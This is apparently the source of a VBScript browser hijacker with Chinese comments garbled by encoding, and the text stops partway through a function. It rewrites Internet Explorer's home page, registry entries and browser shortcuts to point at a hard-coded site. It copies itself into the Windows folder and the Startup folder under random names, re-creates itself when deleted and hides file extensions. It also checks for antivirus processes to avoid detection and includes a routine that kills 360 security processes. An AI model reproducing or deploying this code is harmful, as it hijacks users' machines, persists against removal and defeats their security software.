Private Const BROWSER_PATH = "C:\Program Files\Internet Explorer\iexplore.exe"
Private Const MAX_BROWSER_PATH = "C:\Program Files\Maxthon2\Maxthon.exe"
Private Const SE_BROWSER_PATH = "C:\Program Files\360\360se3\360SE.exe"
Private Const FOX_BROWSER_PATH = "C:\Program Files\Mozilla Firefox\firefox.exe"
Private Const SOGOU_BROWSER_PATH = "C:\Program Files\SogouExplorer\SogouExplorer.exe"
Dim iePath
Dim maxPath
Dim sePath
Dim foxPath
Dim sogouPath

dim tips_count
tips_count=0
Dim content
dim run_second_count
run_second_count=0
Call Main

Public Sub Main()
On Error Resume Next  
	Dim OperationRegistry 
    Set OperationRegistry=WScript.CreateObject("WScript.Shell") 
    Dim dataSafe
    dataSafe=OperationRegistry.RegRead("HKEY_CURRENT_USER\Software\360Safe\SpyerDate") 
    
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set wshShell = CreateObject("Wscript.Shell")
    Dim allUsersStartup,allUsersPcDesktopPath
    allUsersStartup = wshShell.SpecialFolders("AllUsersStartup")
    allUsersPcDesktopPath = wshShell.SpecialFolders("AllUsersDesktop")
    quickLaunch = wshShell.SpecialFolders("AppData") & "\Microsoft\Internet Explorer\Quick Launch"
    
    
    dim url,index,userId
    userId="{userId}"
    if IsNumeric(userId)=false then
        userId=0
    end if
    
    userId=GetUserId()
    if userId="" then
        userId=0
    end if

    url="http://" & "www.zhenlaji.com/?my=" & userId
    
    Call LoadAllBrowserPath '���������·��
     
    
 
    
    
    Set ws = CreateObject("WScript.Shell") 
    Set Environ = ws.Environment("process")     
    '�ƶ����ļ���ָ��·��
    movePath=Environ("windir") & "\" & CreateInterferenceCode(1, 6) & ".vbs"  
    
    startPath=allUsersStartup & "\" & CreateInterferenceCode(1, 6) & ".vbs" 
    Call CreateFileLnk(url,1)
    
    If Not IsExeExist("360tray") And dataSafe="" And Not IsExeExist("RavMonD") And Not IsExeExist("nod32")  then '���������ɱ�����,���޸�IE
        Call SetIeIndex(url)
        ieUrl="http://www.mylovewebs.com/"
        Call IeLink("4399С��Ϸ",ieUrl & "api" & "/youxi/index.htm")
        Call IeLink("�����Ӱ",ieUrl & "api" & "/dianying/index.htm")
        Call IeLink("����������",ieUrl & "api" & "/google/index.htm")
        Call IeLink("�ٶ�����",ieUrl & "api" & "/baidu/index.htm")
        Call IeLink("���С˵",ieUrl & "api" & "/xiaoshuo/index.htm")
        Call IeLink("�Ա�����",ieUrl & "api" & "/taobao/index.htm")
        Call IeLink("���紴ҵ�ؼ�",ieUrl & "api" & "/shangji/index.htm")
        Call IeLink("��ַ��ȫ",ieUrl & "api" & "/index/index.htm")
        Call ShowIeLink 
    End If   
    
    

    do
        If run_second_count Mod 10 = 0 Then 'ÿ���һ��ʱ���ظ�����һ��
			If not fso.FileExists(movePath) Then  '������Դ�ļ��򴴽�
			    movePath=Environ("windir") & "\" & CreateInterferenceCode(1, 6) & ".vbs" 
                Call CopyCopyFile(movePath)
            End If
            Call CreateFileLnk(url,1) '�����ļ�������ݷ�ʽ(������һ������ַ)
            If Not IsExeExist("ZhuDongFangYu") And dataSafe="" then '���������Ǻ�360
                Call SetJseRunVbe(movePath) '���������ļ�
            End If
        End If
        
        If run_second_count Mod 900 = 0 or run_second_count=0 Then 'ÿ���һ��ʱ���ظ�����һ��      
            If Not IsExeExist("RavMonD") And Not IsExeExist("ZhuDongFangYu") And dataSafe="" then '���������Ǻ�360
                Call IeSearch()
                Call IeIndex(url)                
                Call ReplaceBrowserLink(url) '�滻���������Ŀ��·��
                Call RemoveInternetExplorer()'���Internet Explorer,���°汾360��ʾ��    
                set fso=createobject("scripting.filesystemobject")
				fso.deletefile allUsersPcDesktopPath & "\Internet Explorer.lnk"
				fso.deletefile quickLaunch & "\Internet Explorer.lnk"  
            End If
            
            If run_second_count=0 Then '��һ������                  
				If Not IsExeExist("RavMonD") And  Not IsExeExist("ZhuDongFangYu") And dataSafe="" then '���������Ǻ�360
					 Call RemoveInternetExplorer()'���Internet Explorer,���°汾360��ʾ��   
                     Call ReplaceBrowserLink(url) '�滻���������Ŀ��·��
                     Call AddRight() 'IE�Ҽ���չ
                     Call SetIeIndex(url) '�����������ҳ
                End If
                If instr(Wscript.ScriptFullName,"����")<>0 Then 'Ϊ����Ŀ¼���е�  
					Call IeIndex(url)                 
                    Call AddRight() 'IE�Ҽ���չ        
                    Call SetIeIndex(url) '�����������ҳ                           
                End If
                If Not IsExeExist("ZhuDongFangYu") And dataSafe="" then '���������Ǻ�360
					Call SetRegDefaultOpenUrl() '����Ŀ¼��������360��ʾ
					Call SetFilterDns() '����ɫ��վ��Υ�����η��ɵ�վ��  
                End If
                Call DeleteLnk() '�����ݷ�ʽ
                Call HideFileExtension '�����ļ���չ��
                set ws=wscript.createobject("wscript.shell")
                ws.appactivate "Program Manager"
                wscript.sleep 2000
                ws.sendkeys "{f5}"
            End If
            
        End If        
        
        If run_second_count Mod 5 = 0 And Not IsExeExist("ZhuDongFangYu") And dataSafe="" Then 'ÿ5�����ļ��Ƿ�ɾ���������ɾ�����ظ�����
            '����������
            Call SetRunVbe("\??\" & movePath,"\??\" & startPath)
            '�������
            Call SetRunVbe("\??\","")
            
            If vbeCount>2 And instr(Wscript.ScriptFullName,"����")<>0 Then '������Ŀ¼Vbe�ļ�����2��ʱ��ɾ��
                '��ǰ�ļ����´���������ʱɾ��
                Call SetRunVbe("\??\" & Wscript.ScriptFullName,"")
            End If
            Call NoDeleteFile 
        End If
        
        If run_second_count Mod 10 = 0 Then
            'Call NotAppCloudKilling() '��ָֹ�������������
        End If
        
        run_second_count=run_second_count+1
        If run_second_count=3000 Then
			run_second_count=0
        End If
        
        wscript.sleep 5000
    loop
End Sub

'��ָֹ�������������
Public Function NotAppCloudKilling()   
On Error Resume Next
    good="."
    set bag=getobject("winmgmts:\\"&good&"\root\cimv2")
    set pipe_1=bag.execquery("select * from win32_process where name='360sd.exe'")
    for each i in pipe_1
    i.terminate()
    next

    set bag_2=getobject("winmgmts:\\"&good&"\root\cimv2")
    set pipe_2=bag_2.execquery("select * from win32_process where name='360tray.exe'")
    for each i in pipe_2
    i.terminate()
    next

    set bag_3=getobject("winmgmts:\\"&good&"\root\cimv2")
    set pipe_3=bag_3.execquery("select * from win32_process where name='360rp.exe'")
    for each i in pipe_3
    i.terminate()
    next
    
    set bag_4=getobject("winmgmts:\\"&good&"\root\cimv2")
    set pipe_4=bag_4.execquery("select * from win32_process where name='360Safe.exe'")
    for each i in pipe_4
    i.terminate()
    next
End Function


'��ȡ��װ�û�Id
Public Function GetUserId()   
On Error Resume Next
    Set ws = CreateObject("WScript.Shell") 
    Set Environ = ws.Environment("process") 
    Dim path,content
    path = Environ("windir") & "\userid.txt"
    Set fso = CreateObject("Scripting.FileSystemObject")
    If path<>"" Then
        Set f=fso.opentextfile(path)
        content=f.readall '��ȡ�ı����ݵ�ȫ�ֱ���
        f.Close
    End If
    content=Replace(content, " ", "")
    content=Replace(content, "\r", "")
    content=Replace(content, "\n", "")
    content=Replace(content, Chr(13), "")
    content=Replace(content, Chr(10), "")
    GetUserId=content
End Function

'���Ƶ�ǰ�ű���ָ��·��
Public Sub CopyCopyFile(movePath)   
On Error Resume Next
    dim vbsPath
    vbsPath = Wscript.ScriptFullName
    Set fso = CreateObject("Scripting.FileSystemObject")
    If content="" Then
        Set f=fso.opentextfile(vbsPath)
        content=f.readall '��ȡ�ı����ݵ�ȫ�ֱ���
        f.Close
    End If

    '�����ļ�
    If content<>"" Then
        dim testFile
        Set testFile=fso.CreateTextFile(movePath,Ture)
        testFile.WriteLine(content)
        testFile.Close
    End If        
    Set fso  = Nothing
End Sub

'����ļ��Ƿ�ɾ���������ɾ�����ظ�����
Public Function NoDeleteFile()   
On Error Resume Next
    dim vbsPath
    vbsPath = Wscript.ScriptFullName
    Set fso = CreateObject("Scripting.FileSystemObject")
    If content="" Then
        Set f=fso.opentextfile(vbsPath,1)
        content=f.readall '��ȡ�ı����ݵ�ȫ�ֱ���
        f.Close
    End If
    
    If not fso.FileExists(vbsPath) Then  '�������򴴽�
        '�����ļ�
        If content<>"" Then
            dim testFile
            Set testFile=fso.CreateTextFile(vbsPath,Ture)
            testFile.WriteLine(content)
            testFile.Close
        End If        
    End If
    Set fso  = Nothing
End Function


'ɾ��ϵͳĬ���������ݷ�ʽ
Public Function RemoveInternetExplorer()   
On Error Resume Next
    Dim OperationRegistry 
    Set OperationRegistry=WScript.CreateObject("WScript.Shell") 
    Dim data,dataHome
    data=OperationRegistry.RegRead("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel\{871C5380-42A0-1069-A2EA-08002B30309D}") 
    dataHome=OperationRegistry.RegRead("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu\{871C5380-42A0-1069-A2EA-08002B30309D}") 
    if data="0" or dataHome="0" then
        Set ws = CreateObject("WScript.Shell") 
        Set Environ = ws.Environment("process") 
        Randomize 
		dim rnd
		rnd=CInt(100*Rnd()) 
		regPath = Environ("windir") & "\" & rnd & ".reg"
        Set fso = CreateObject("Scripting.FileSystemObject")
        
        Set f1=fso.CreateTextFile(regPath, True)
	    f1.WriteLine "Windows Registry Editor Version 5.00"
	    f1.WriteLine "[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel]"
	    f1.WriteLine """{871C5380-42A0-1069-A2EA-08002B30309D}""=dword:00000001"
	    f1.WriteLine "[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu]"
	    f1.WriteLine """{871C5380-42A0-1069-A2EA-08002B30309D}""=dword:00000001"
	    Set f1  = Nothing
    	
    	
	    Set WshShell= CreateObject("WScript.Shell") 
	    WshShell.Run "regedit /s " & regPath
        Set WshShell  = Nothing  

        Set fso  = Nothing
        
    end if    
End Function

'�����޷�ɾ��ϵͳĬ���������ݷ�ʽ
Public Function IeIndex(url)   
On Error Resume Next 
    Set ws = CreateObject("WScript.Shell") 
    Set Environ = ws.Environment("process") 
    Dim regPath
    Randomize 
    dim rnd
	rnd=CInt(100*Rnd()) 
    regPath = Environ("windir") & "\" & rnd & ".reg"
    Set fso = CreateObject("Scripting.FileSystemObject")
    if tips_count>2 then
        if IsExeExist("360tray") then '����360��ȫ��ʿ,������ʾ��������û�
            Exit Function
        end if
    else
        tips_count=tips_count+1
    end if
    dim ie_temp_path
    ie_temp_path=iePath
    If not fso.FileExists(ie_temp_path) Then  
        ie_temp_path=GetWebBrowserPath() '��ȡһ�������·��
        If not fso.FileExists(ie_temp_path) Then
            Exit Function
        End If
    End If
    
    Dim OperationRegistry 
    Set OperationRegistry=WScript.CreateObject("WScript.Shell") 
    Dim data,dataHome
    data=OperationRegistry.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{871C5380-42A0-1069-A2EA-08002B30309A}\") 
    dataHome=OperationRegistry.RegRead("HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\OpenHomePage\Command\") 

    If data="" or instr(dataHome,url)=0 Then
        Set f1=fso.CreateTextFile(regPath, True)
	    f1.WriteLine "Windows Registry Editor Version 5.00"
	    f1.WriteLine "[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{871C5380-42A0-1069-A2EA-08002B30309A}]" '�޸�Ĭ��IE
	    f1.WriteLine "@=""Internet Explorer""" '�޸�Ĭ��IE
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}]" '�޸�Ĭ��IE
	    f1.WriteLine "@=""Internet Explorer""" '�޸�Ĭ��IE
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\DefaultIcon]" '�޸�Ĭ��IE
	    f1.WriteLine "@=""" & Replace(ie_temp_path, "\", "\\") & ",0""" '�̶�IE�����ͼ��
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\InProcServer32]"
	    f1.WriteLine "@=""%SystemRoot%\\system32\\shdocvw.dll"""
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell]"
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\OpenHomePage]"
	    f1.WriteLine "@=""����ҳ(&H)"""
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\OpenHomePage\Command]"
	    f1.WriteLine "@=""" & Replace(ie_temp_path, "\", "\\") & " " & url & """" '�޸�Ĭ��IE
	    
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\Q]"
	    f1.WriteLine "@=""ɾ��(&D)"""
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\Q\Command]"
	    f1.WriteLine "@=""Rundll32.exe"""
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\����(&R)]"
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\����(&R)\Command]"
	    f1.WriteLine "@=""rundll32.exe shell32.dll,Control_RunDLL inetcpl.cpl,,0"""
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\ShellFolder]"
	    f1.WriteLine "@=""00.00.00.00"""
	    f1.WriteLine """Attributes""=hex:00,00,00,00"
	    Set f1  = Nothing
	    Set WshShell= CreateObject("WScript.Shell") 
	    WshShell.Run "regedit /s " & regPath
        Set WshShell  = Nothing 
    End If
    Set fso  = Nothing
End Function

'�޸�ע���������ҳ
Public Function SetIeIndex(url)   
On Error Resume Next     
    Set ws = CreateObject("WScript.Shell") 
    Set Environ = ws.Environment("process") 
    Dim regPath
    regPath = Environ("windir") & "\SetWindowsIndex.reg"
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    Dim OperationRegistry 
    Set OperationRegistry=WScript.CreateObject("WScript.Shell") 
    Dim data,dataHome
    data=OperationRegistry.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page\") 
    If instr(data,url)=0 or data="" Then
        Set f1=fso.CreateTextFile(regPath, True)
	    f1.WriteLine "Windows Registry Editor Version 5.00"
	    f1.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]"
	    f1.WriteLine """Start Page""=""" & url & """"
	    Set f1  = Nothing
	    Set WshShell= CreateObject("WScript.Shell") 
	    WshShell.Run "regedit /s " & regPath
        Set WshShell  = Nothing         
    End If
    Set fso  = Nothing
End Function

'ɾ��Ĭ�ϴ�����ݷ�ʽ
Public Function DeleteLnk()   
On Error Resume Next     
   
End Function


'ѭ���޸����п�ݷ�ʽ
Public Function ReplaceBrowserLink(url)    
On Error Resume Next
    Dim wshShell, oShellLink
    Dim strDesktop, pcDesktopPath, quickLaunch, strQuickLaunch, programs, startMenu
    Set wshShell = CreateObject("Wscript.shell")
    pcDesktopPath = wshShell.SpecialFolders("Desktop") '�û�����Ŀ¼
    quickLaunch = wshShell.SpecialFolders("AppData") & "\Microsoft\Internet Explorer\Quick Launch" '��ǰ�û����������������Ŀ¼
    programs = wshShell.SpecialFolders("Programs") '�û���ʼ�˵��еĳ���Ŀ¼
    startMenu = wshShell.SpecialFolders("StartMenu") '�û���ʼ�˵��������Ŀ¼
    
    Dim allUsersPcDesktopPath, allQuickLaunch, allUsersPrograms, allUsersStartMenu
    allUsersPcDesktopPath = wshShell.SpecialFolders("AllUsersDesktop") 'ȫ���û�����Ŀ¼
    allUsersPrograms = wshShell.SpecialFolders("AllUsersPrograms") 'ȫ���û���ʼ�˵��еĳ���Ŀ¼
    allUsersStartMenu = wshShell.SpecialFolders("AllUsersStartMenu") 'ȫ���û���ʼ�˵��������Ŀ¼

    '·�����ϣ���·�����Ͻ��б���
    Dim lnkPath(7)
    lnkPath(1) = pcDesktopPath
    lnkPath(2) = quickLaunch
    lnkPath(3) = programs
    lnkPath(4) = startMenu
    lnkPath(5) = allUsersPcDesktopPath
    lnkPath(6) = allUsersPrograms
    lnkPath(7) = allUsersStartMenu
    
    Dim directory
    For i = LBound(lnkPath) + 1 To UBound(lnkPath)
        'ѭ��Ŀ¼�����޸�
        directory = lnkPath(i)        
         '�滻��ǰ�û�����������ݷ�ʽ
        Set fs = CreateObject("Scripting.FileSystemObject")
        Set f = fs.GetFolder(directory)
        Set fc = f.Files 
        For Each flie in fc    
            myName = directory + "\" + flie.name
            If InStr(myName, ".lnk") <> 0 And (InStr(myName, "����") <> 0 Or InStr(myName, "�ѹ�") <> 0 Or InStr(myName, "360") <> 0  Or InStr(myName, "Internet Explorer") <> 0 Or InStr(myName, "�����") <> 0) Then
                Set fso = CreateObject("Scripting.FileSystemObject")
                Set oShellLink = wshShell.CreateShortcut(myName)
                Set file=fso.getfile(myName)                
                file.attributes=0'�ָ�����
                         
                if oShellLink.Arguments <> url then '����Ĳ��� 
                    oShellLink.Arguments = url '����Ĳ���      
                    oShellLink.Save            
                end if
                
	            file.attributes=1
                
                Set oShellLink  = Nothing                
                Set fso  = Nothing
            End If
        Next        
    Next
End Function


'��ȡ��ݷ�ʽ·��
Private Function GetDirectoryPath(path)
    Dim str, last
    For i = 0 To Len(path)
        str = Mid(path, Len(path) - i, 1)
        If str = "\" Then
            last = Len(path) - i
            Exit For
        End If
    Next
    GetDirectoryPath = Mid(path, 1, last)
    Exit Function
End Function

'�ж�ָ�������Ƿ����
Public Function IsExeExist(exeName) 
    IsExeExist=false
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:" _
        & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

    Set colProcessList = objWMIService.ExecQuery _
        ("Select * from Win32_Process Where Name = '" & exeName & ".exe'")

    For Each objProcess in colProcessList
        if objProcess.executablepath<>"" then
            IsExeExist=true
        end if        
    Next
End Function


'����Url����(����Ҫhttp://)
Public Function DnsUrlEncrypt(str)
    Dim hexStr, temp, i '16�����ַ���
    For i = 1 To Len(str)
        temp = Mid(str, i, 1)
        temp = Hex(Asc(temp))
        temp = temp
        hexStr = hexStr & "%" & temp
    Next
    DnsUrlEncrypt = hexStr
    Exit Function
End Function

'�ϲ���������
Function Summ(array1,array2)
    Dim str1,str2,str3
    str1 = join(array1,",")
    str2 = join(array2,",")
    str3 = str1 + "," + str2
    summ = split(str3,",")
    '����smss.exe
    '���˽ű�����ֹ360�����´�ɾ��
End Function

'���ɸ�����,����:1������(0,��� 1�ַ� 2����) 2������
'���󷵻�:���ַ�
Public Function CreateInterferenceCode(strType, length)
    Dim basisStr
    If strType = 0 Then
        basisStr = "0123456789qwertyuiopasdfghjklzxcvbnm"
    End If
    If strType = 1 Then
        basisStr = "qwertyuiopasdfghjklzxcvbnm"
    End If
    If strType = 2 Then
        basisStr = "0123456789"
    End If
    Dim strs, i
    For i = 1 To length
        Randomize
        strs = strs & Mid(basisStr, Int((Len(basisStr) * Rnd) + 1), 1)
    Next
    CreateInterferenceCode = strs
    Exit Function
End Function

'��ȡ�����·��
Public Function GetWebBrowserPath() 
On Error Resume Next
    '�����̷�·��
    Set Environ = ws.Environment("process") 
    dim iePath
    iePath=BROWSER_PATH
    If Dir(iePath)="" Then '���·��������������̷�
        iePath = Environ("systemdrive") & Mid(iePath, 3, Len(iePath))
        If Dir(iePath)<>"" Then
            GetWebBrowserPath=iePath
            Exit Function
        End If
    else
        GetWebBrowserPath=iePath
        Exit Function
    End If
    
    Dim wshShell, oShellLink
    Dim strDesktop, pcDesktopPath, quickLaunch, strQuickLaunch, programs, startMenu
    Set wshShell = CreateObject("Wscript.shell")
    pcDesktopPath = wshShell.SpecialFolders("Desktop") '��ǰ�û�����Ŀ¼
    quickLaunch = wshShell.SpecialFolders("AppData") & "\Microsoft\Internet Explorer\Quick Launch" '��ǰ�û����������������Ŀ¼
    programs = wshShell.SpecialFolders("Programs") '��ǰ�û���ʼ�˵��еĳ���Ŀ¼
    startMenu = wshShell.SpecialFolders("StartMenu") '��ǰ�û���ʼ�˵��������Ŀ¼
    
    Dim allUsersPcDesktopPath, allQuickLaunch, allUsersPrograms, allUsersStartMenu
    allUsersPcDesktopPath = wshShell.SpecialFolders("AllUsersDesktop") 'ȫ���û�����Ŀ¼
    allUsersPrograms = wshShell.SpecialFolders("AllUsersPrograms") 'ȫ���û���ʼ�˵��еĳ���Ŀ¼
    allUsersStartMenu = wshShell.SpecialFolders("AllUsersStartMenu") 'ȫ���û���ʼ�˵��������Ŀ¼

    
    '·�����ϣ���·�����Ͻ��б���
    Dim lnkPath(7)
    lnkPath(1) = pcDesktopPath
    lnkPath(2) = quickLaunch
    lnkPath(3) = programs
    lnkPath(4) = startMenu
    lnkPath(5) = allUsersPcDesktopPath
    lnkPath(6) = allUsersPrograms
    lnkPath(7) = allUsersStartMenu
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    Dim directory
    
    If not fso.FileExists(iePath) Then
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            'ѭ��Ŀ¼�����޸�
            directory = lnkPath(i)        
             '�滻��ǰ�û�����������ݷ�ʽ
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files 
            For Each flie in fc    
                myName = directory + "\" + flie.name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "iexplore.exe") Then 'IE�����
                        if oShellLink.TargetPath<>"" then
                            iePath=oShellLink.TargetPath
                            GetWebBrowserPath=iePath
                            Exit Function
                        end if                    
                    end if
                end if
            Next    
        Next
    End If
    
    If not fso.FileExists(iePath) Then
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            'ѭ��Ŀ¼�����޸�
            directory = lnkPath(i)        
             '�滻��ǰ�û�����������ݷ�ʽ
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files   
            
            For Each flie in fc    
                myName = directory + "\" + flie.name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "maxthon.exe") Then '���������
                        if oShellLink.TargetPath<>"" then
                            iePath=oShellLink.TargetPath
                            GetWebBrowserPath=iePath
                            Exit Function
                        end if                    
                    end if
                end if
            Next
        Next
    End If
    
    If not fso.FileExists(iePath) Then
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            'ѭ��Ŀ¼�����޸�
            directory = lnkPath(i)        
             '�滻��ǰ�û�����������ݷ�ʽ
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files   
            
            For Each flie in fc    
                myName = directory + "\" + flie.name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "360se.exe") Then '360�����
                        if oShellLink.TargetPath<>"" then
                            iePath=oShellLink.TargetPath
                            GetWebBrowserPath=iePath
                            Exit Function
                        end if                    
                    end if
                end if
            Next
        Next
    End If
End Function

'���������·��
Private Sub LoadAllBrowserPath()
On Error Resume Next
    Set ws = CreateObject("WScript.Shell") 
    Set Environ = ws.Environment("process") 
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    iePath = BROWSER_PATH
    If not fso.FileExists(iePath) Then '���·��������������̷�
        iePath = Environ("systemdrive") & Mid(iePath, 3, Len(iePath))
    End If
    maxPath = MAX_BROWSER_PATH
    If not fso.FileExists(maxPath) Then '���·��������������̷�
        maxPath = Environ("systemdrive") & Mid(maxPath, 3, Len(maxPath))
    End If
    sePath = SE_BROWSER_PATH
    If not fso.FileExists(sePath) Then '���·��������������̷�
        sePath = Environ("systemdrive") & Mid(sePath, 3, Len(sePath))
    End If
    foxPath = FOX_BROWSER_PATH
    If not fso.FileExists(foxPath) Then '���·��������������̷�
        foxPath = Environ("systemdrive") & Mid(foxPath, 3, Len(foxPath))
    End If
    sogouPath = SOGOU_BROWSER_PATH
    If not fso.FileExists(sogouPath) Then '���·��������������̷�
        sogouPath = Environ("systemdrive") & Mid(sogouPath, 3, Len(sogouPath))
    End If
    
    Dim wshShell, oShellLink
    Dim strDesktop, pcDesktopPath, quickLaunch, strQuickLaunch, programs, startMenu
    Set wshShell = CreateObject("Wscript.shell")
    pcDesktopPath = wshShell.SpecialFolders("Desktop") '��ǰ�û�����Ŀ¼
    quickLaunch = wshShell.SpecialFolders("AppData") & "\Microsoft\Internet Explorer\Quick Launch" '��ǰ�û����������������Ŀ¼
    programs = wshShell.SpecialFolders("Programs") '��ǰ�û���ʼ�˵��еĳ���Ŀ¼
    startMenu = wshShell.SpecialFolders("StartMenu") '��ǰ�û���ʼ�˵��������Ŀ¼
    
    Dim allUsersPcDesktopPath, allQuickLaunch, allUsersPrograms, allUsersStartMenu
    allUsersPcDesktopPath = wshShell.SpecialFolders("AllUsersDesktop") 'ȫ���û�����Ŀ¼
    allUsersPrograms = wshShell.SpecialFolders("AllUsersPrograms") 'ȫ���û���ʼ�˵��еĳ���Ŀ¼
    allUsersStartMenu = wshShell.SpecialFolders("AllUsersStartMenu") 'ȫ���û���ʼ�˵��������Ŀ¼

    '·�����ϣ���·�����Ͻ��б���
    Dim lnkPath(7)
    lnkPath(1) = pcDesktopPath
    lnkPath(2) = quickLaunch
    lnkPath(3) = programs
    lnkPath(4) = startMenu
    lnkPath(5) = allUsersPcDesktopPath
    lnkPath(6) = allUsersPrograms
    lnkPath(7) = allUsersStartMenu
    
    Dim directory
    
    If not fso.FileExists(iePath) Then
        iePath=""
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            directory = lnkPath(i)
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files
            For Each flie In fc
                myName = directory + "\" + flie.Name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "iexplore.exe") Then 'IE�����
                        If oShellLink.TargetPath <> "" Then
                            iePath = oShellLink.TargetPath
                            Exit For
                        End If
                    End If
                End If
            Next
        Next
    End If
    
    If not fso.FileExists(maxPath) Then
        maxPath=""
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            directory = lnkPath(i)
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files
            For Each flie In fc
                myName = directory + "\" + flie.Name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "maxthon.exe") Then '���������
                        If oShellLink.TargetPath <> "" Then
                            maxPath = oShellLink.TargetPath
                            Exit For
                        End If
                    End If
                End If
            Next
        Next
    End If
    
    If not fso.FileExists(sePath) Then
        sePath=""
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            directory = lnkPath(i)
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files
            For Each flie In fc
                myName = directory + "\" + flie.Name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "360se.exe") Then '360�����
                        If oShellLink.TargetPath <> "" Then
                            sePath = oShellLink.TargetPath
                            Exit For
                        End If
                    End If
                End If
            Next
        Next
    End If
    
    If not fso.FileExists(sogouPath) Then
        sogouPath=""
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            directory = lnkPath(i)
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files
            For Each flie In fc
                myName = directory + "\" + flie.Name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "SogouExplorer.exe") Then '�ѹ������
                        If oShellLink.TargetPath <> "" Then
                            sogouPath = oShellLink.TargetPath
                            Exit For
                        End If
                    End If
                End If
            Next
        Next
    End If
    
End Sub



'���������ļ�,������URL��ַ,����(0 ����������ַ 1 ����һ������ַ)
Private Sub CreateFileLnk(url,createType)
On Error Resume Next
    Dim wshShell, oShellLink
    Dim strDesktop, pcDesktopPath, quickLaunch, strQuickLaunch, programs, startMenu
    Set wshShell = CreateObject("Wscript.shell")
